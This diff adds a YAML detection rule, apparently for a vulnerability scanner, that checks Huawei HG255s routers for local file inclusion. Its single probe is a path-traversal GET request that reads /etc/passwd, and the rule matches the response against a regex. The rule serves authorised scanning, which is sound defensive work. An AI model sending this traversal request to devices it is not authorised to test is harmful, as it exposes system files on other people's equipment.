@@ -1,0 +1,30 @@
+schema_version: 1
+id: "cortex.community:huawei-hg255s-lfi"
+rule_version: "1.0.0"
+requires:
+  engine_api: 1
+  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
+info:
+  name: "Huawei HG255s - Local File Inclusion"
+  description: "Huawei HG255s is vulnerable to local file inclusion due to insufficient validation of the received HTTP requests. A remote attacker may access the local files on the device without authentication. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
+  references:
+    - "https://cxsecurity.com/issue/WLB-2017090053"
+    - "https://www.youtube.com/watch?v=n02toTFkLOU"
+  cwes: [23]
+  tags: ["huawei", "lfi", "router", "vuln", "nuclei", "auto-ported", "signal"]
+  remediation: "See the referenced advisory / template source for remediation."
+finding:
+  sink_type: "VULNERABLE_COMPONENT"
+  impact: "INFORMATION_DISCLOSURE"
+  severity: "High"
+  root_cause: "nuclei-ported-signal"
+execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
+steps:
+  - id: "probe0"
+    request: { method: "GET", path: "/css/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd" }
+proof:
+  kind: "signal.v1"
+  assertions:
+    all:
+      - regex: { left: { ref: "steps.probe0.body" }, right: { value: "root:[x*]:0:0" } }
+      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
